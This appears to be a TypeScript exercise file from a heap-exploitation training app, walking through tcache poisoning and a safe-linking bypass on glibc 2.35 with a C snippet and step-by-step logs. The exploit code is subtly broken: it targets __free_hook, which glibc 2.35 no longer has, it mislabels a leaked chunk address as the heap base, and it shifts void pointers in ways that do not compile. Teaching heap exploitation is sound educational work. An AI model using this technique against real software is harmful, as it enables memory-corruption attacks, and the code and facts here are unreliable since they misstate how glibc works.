import { Exercise } from '../types';

const exercise: Exercise = {
  id: 'glibc-109',
  unitId: 'unit19-glibc-bypass',
  title: '109: Tcache Poison on glibc 2.35',
  desc: '<b>Goal:</b> On glibc 2.35+, tcache fd pointers are <strong>mangled</strong> with PROTECT_PTR: <code>fd = (pos >> 12) ^ target</code>. You can\'t just write a plain address as fd — you need to know the heap base to XOR correctly. This exercise shows how a heap leak enables tcache poisoning despite safe-linking.',
  source: {
    c: [
      { text: '// glibc 2.35 — safe-linking (PROTECT_PTR)', cls: 'cmt' },
      { text: '// fd = (chunk_data_addr >> 12) ^ next', cls: 'cmt' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    void *a = malloc(16);', cls: 'highlight' },
      { text: '    void *b = malloc(16);', cls: 'highlight' },
      { text: '    free(a);', cls: '' },
      { text: '    free(b);', cls: 'highlight' },
      { text: '    // b->fd is mangled: (b >> 12) ^ a', cls: 'cmt' },
      { text: '', cls: '' },
      { text: '    // Step 1: Leak heap address', cls: 'cmt' },
      { text: '    size_t leak = *(size_t*)b;', cls: 'highlight' },
      { text: '    size_t heap_base = leak ^ ((size_t)b >> 12);', cls: 'highlight vuln' },
      { text: '', cls: '' },
      { text: '    // Step 2: Compute mangled target', cls: 'cmt' },
      { text: '    size_t target = &__free_hook;', cls: '' },
      { text: '    *(size_t*)b = (b >> 12) ^ target;', cls: 'highlight vuln' },
      { text: '    malloc(16); // returns a', cls: '' },
      { text: '    void *d = malloc(16); // returns target!', cls: 'highlight vuln' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'step',
  vizMode: 'heap',
  heapSize: 512,
  glibcVersion: '2.35',
  showLabels: true,
  steps: [
    {
      action: 'init',
      log: ['info', 'glibc 2.35 introduced <strong>safe-linking</strong> (PROTECT_PTR). The fd pointer in freed tcache/fastbin chunks is XORed with <code>(chunk_data_address >> 12)</code>. This means writing a raw address into fd won\'t work — the allocator will demangle it and get garbage.'],
    },
    {
      log: ['action', 'Allocating A (16 bytes) and B (16 bytes).'],
      vizAction: (sim: any) => {
        const a = sim.malloc(16);
        const b = sim.malloc(16);
        if (a) sim._nameMap = { A: a.addr };
        if (b) sim._nameMap = { ...sim._nameMap, B: b.addr };
      },
      srcLine: 5,
    },
    {
      log: ['action', 'free(a), then free(b). B\'s fd now points to A, but <strong>mangled</strong>: fd = ((B.data >> 12) ^ A.data).'],
      vizAction: (sim: any) => {
        const aAddr = sim._nameMap?.A;
        const bAddr = sim._nameMap?.B;
        if (aAddr !== undefined) sim.free(aAddr);
        if (bAddr !== undefined) sim.free(bAddr);
      },
      srcLine: 8,
    },
    {
      log: ['info', 'Reading B\'s fd gives the mangled value. To recover A\'s real address: <code>real = mangled ^ (B.data >> 12)</code>. The first chunk in tcache has fd = <code>(pos >> 12) ^ 0</code> (since there\'s no next chunk), which directly leaks <code>pos >> 12</code> — the heap base\'s upper bits.'],
      srcLine: 12,
    },
    {
      log: ['success', 'With the heap leak, we can compute <strong>any mangled fd</strong>. To poison tcache: write <code>(B.data >> 12) ^ target_addr</code> into B\'s fd. The allocator demanges it to <code>target_addr</code> and returns it from malloc. Safe-linking is bypassed!'],
      srcLine: 17,
      done: true,
    },
  ],
  check: () => true,
  winTitle: 'Safe-Linking Bypass!',
  winMsg: 'glibc 2.35 safe-linking XORs fd with (addr >> 12). A heap address leak lets you compute the mangling key and craft valid fd pointers for tcache poisoning.',
};

export default exercise;
